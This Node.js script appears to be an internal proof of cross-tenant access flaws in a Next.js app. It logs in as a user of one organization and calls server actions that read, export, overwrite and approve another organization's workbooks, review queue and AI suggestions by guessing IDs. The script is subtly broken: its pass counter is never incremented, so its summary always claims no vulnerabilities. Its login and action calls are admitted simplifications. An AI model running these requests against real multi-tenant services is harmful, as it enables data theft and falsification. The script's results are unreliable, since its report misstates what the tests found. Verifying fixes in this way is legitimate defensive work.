#!/usr/bin/env node

// ─── RB-01 Phase 4: Cross-Tenant Attack Proof ───
// Run against a test Next.js instance with two organizations and test data.
// 
// Prerequisites:
//   1. A running Next.js app with test database
//   2. Two organizations exist: Org A and Org B
//   3. Org A has a user: org-a-user@example.com / test-password
//   4. Org B has a workbook with ID known to the attacker
//   5. OR: use --setup flag to seed test data first
//
// Usage:
//   node proof/cross-tenant-attack.mjs --base-url http://localhost:3000
//   node proof/cross-tenant-attack.mjs --setup          # seed test data first
//
// Exit codes:
//   0 = All expected vulnerabilities confirmed (gates PASS)
//   1 = No vulnerabilities found (gates FAIL — unexpected)
//   2 = Setup/connection error

const BASE_URL = process.argv.includes("--base-url")
  ? process.argv[process.argv.indexOf("--base-url") + 1]
  : "http://localhost:3000";

const DO_SETUP = process.argv.includes("--setup");

// ─── Configuration ───

const ORG_A = { email: "org-a-user@example.com", password: "test-password" };
const ORG_B = { 
  name: "Org B (Victim)",
  workbookId: "c7b7b7b7b7b7b7b7b7b7b004",
  organizationId: "c7b7b7b7b7b7b7b7b7b7b001",
  projectId: "c7b7b7b7b7b7b7b7b7b7b003",
  suggestionId: "c7b7b7b7b7b7b7b7b7b7b007",
  lineId: "c7b7b7b7b7b7b7b7b7b7b005",
};

// ─── Helpers ───

let authCookie = null;

async function login(email, password) {
  // Simulates browser login. In a real test, replace with actual session cookie.
  const res = await fetch(`${BASE_URL}/api/auth/callback/credentials`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password, csrfToken: "test" }),
    redirect: "manual",
  });
  const cookies = res.headers.get("set-cookie");
  if (!cookies) {
    console.error("❌ Login failed — check credentials and app status");
    process.exit(2);
  }
  authCookie = cookies.split(";")[0];
  console.log(`✅ Logged in as ${email}`);
}

async function callServerAction(path, actionName, args) {
  // In Next.js, server actions are called via POST to the page path
  // with a Next-Action header. The exact mechanism depends on the build.
  // This is a simplified simulation.
  const res = await fetch(`${BASE_URL}${path}`, {
    method: "POST",
    headers: {
      "Content-Type": "text/plain;charset=UTF-8",
      "Next-Action": actionName,
      Cookie: authCookie || "",
    },
    body: JSON.stringify(args),
  });
  return res.ok ? await res.text() : `HTTP ${res.status}: ${res.statusText}`;
}

function fail(exploit, detail) {
  console.log(`  ❌ ${exploit}: ${detail}`);
  return false;
}

function pass(exploit, detail) {
  console.log(`  ✅ ${exploit}: ${detail}`);
  return true;
}

// ─── Exploit Tests ───

let testCount = 0;
let passedCount = 0;

async function testReadAnyWorkbook() {
  testCount++;
  console.log("\n[E1] Read Org B's workbook");
  
  try {
    const result = await callServerAction(
      `/local-content/workbook/${ORG_B.workbookId}`,
      "getWorkbookAction",
      [ORG_B.workbookId],
    );
    
    if (result.includes("error") || result.includes("not found")) {
      return fail("E1", `Could not read workbook: ${result.substring(0, 100)}`);
    }
    
    return pass("E1", `Read workbook data: ${result.substring(0, 100)}...`);
  } catch (err) {
    return fail("E1", err.message);
  }
}

async function testWriteAnyLine() {
  testCount++;
  console.log("\n[E2] Write to Org B's workbook line");
  
  try {
    const result = await callServerAction(
      `/local-content/workbook/${ORG_B.workbookId}`,
      "updateWorkbookLineAction",
      [ORG_B.lineId, 999999, "FALSIFIED DATA"],
    );
    
    if (result.includes("error") || result.includes("not found")) {
      return fail("E2", `Could not write line: ${result.substring(0, 100)}`);
    }
    
    return pass("E2", "Wrote fraudulent data to Org B's workbook line");
  } catch (err) {
    return fail("E2", err.message);
  }
}

async function testExportAnyWorkbook() {
  testCount++;
  console.log("\n[E10] Export Org B's workbook (data exfiltration)");
  
  try {
    const result = await callServerAction(
      `/local-content/workbook/${ORG_B.workbookId}`,
      "exportWorkbookAction",
      [ORG_B.workbookId],
    );
    
    if (result.includes("error") || result.includes("not found")) {
      return fail("E10", `Could not export: ${result.substring(0, 100)}`);
    }
    
    return pass("E10", `Exported workbook: ${result.substring(0, 100)}...`);
  } catch (err) {
    return fail("E10", err.message);
  }
}

async function testReviewAnySuggestion() {
  testCount++;
  console.log("\n[E13] Review Org B's AI suggestion");
  
  try {
    const result = await callServerAction(
      "/local-content/review-center",
      "reviewSuggestionAction",
      [ORG_B.suggestionId, "approved", "Approved by attacker from Org A"],
    );
    
    if (result.includes("error") || result.includes("not found")) {
      return fail("E13", `Could not review: ${result.substring(0, 100)}`);
    }
    
    return pass("E13", "Approved Org B's AI suggestion from Org A's session");
  } catch (err) {
    return fail("E13", err.message);
  }
}

async function testReadReviewQueue() {
  testCount++;
  console.log("\n[E21] Read Org B's review queue");
  
  try {
    const result = await callServerAction(
      "/local-content/review-center",
      "getReviewQueueAction",
      [ORG_B.organizationId],
    );
    
    if (result.includes("error") || result.includes("\"total\":0")) {
      return fail("E21", `Queue empty or error: ${result.substring(0, 100)}`);
    }
    
    return pass("E21", `Read Org B's review queue: ${result.substring(0, 100)}...`);
  } catch (err) {
    return fail("E21", err.message);
  }
}

async function testAiReviewOnWrongOrg() {
  testCount++;
  console.log("\n[E16] Run AI review targeting Org B's workbook");
  
  try {
    const result = await callServerAction(
      `/local-content/workbook/${ORG_B.workbookId}`,
      "runWorkbookAiReviewAction",
      [ORG_B.organizationId, ORG_B.workbookId, []],
    );
    
    if (result.includes("error")) {
      return fail("E16", `Could not run AI review: ${result.substring(0, 100)}`);
    }
    
    return pass("E16", "Triggered AI review on Org B's workbook from Org A's session");
  } catch (err) {
    return fail("E16", err.message);
  }
}

// ─── Main ───

async function main() {
  console.log("╔══════════════════════════════════════════════════╗");
  console.log("║   RB-01 Cross-Tenant Attack Proof              ║");
  console.log("║   Target:", BASE_URL.padEnd(40), "║");
  console.log("╚══════════════════════════════════════════════════╝");
  
  if (DO_SETUP) {
    console.log("\n⚠️  --setup: run `npx prisma db seed` and create test orgs manually.");
    console.log("   This script does NOT create test data automatically.");
    console.log("   Ensure Org A user, Org B organization/workspace/project exist.\n");
  }
  
  try {
    await login(ORG_A.email, ORG_A.password);
  } catch (err) {
    console.error("❌ Login failed:", err.message);
    process.exit(2);
  }
  
  // Run all exploit tests
  const results = await Promise.allSettled([
    testReadAnyWorkbook(),
    testWriteAnyLine(),
    testExportAnyWorkbook(),
    testReviewAnySuggestion(),
    testReadReviewQueue(),
    testAiReviewOnWrongOrg(),
  ]);
  
  results.forEach((r) => {
    if (r.status === "rejected") {
      console.log(`  ❌ Test crashed: ${r.reason}`);
    }
  });
  
  // Summary
  console.log("\n" + "═".repeat(50));
  console.log(`Tests: ${testCount}, Passed: ${passedCount}, Failed: ${testCount - passedCount}`);
  
  if (passedCount === testCount && testCount > 0) {
    console.log("\n🔴 ALL VULNERABILITIES CONFIRMED: Cross-tenant data access is POSSIBLE");
    console.log("   Zero Tenant Leakage gate: NOT PASSED");
    console.log("   RB-01: Cannot close — remediation required");
    process.exit(0);
  } else if (passedCount === 0) {
    console.log("\n✅ No vulnerabilities found (unexpected — check test configuration)");
    console.log("   Possible reasons:");
    console.log("   - Test IDs are incorrect");
    console.log("   - Server actions are already protected");
    console.log("   - App is not running or reachable");
    process.exit(1);
  } else {
    console.log(`\n⚠️  Partial: ${passedCount}/${testCount} vulns confirmed`);
    console.log("   Review failures could be due to ID mismatch");
    process.exit(0);
  }
}

main().catch((err) => {
  console.error("Fatal:", err);
  process.exit(2);
});
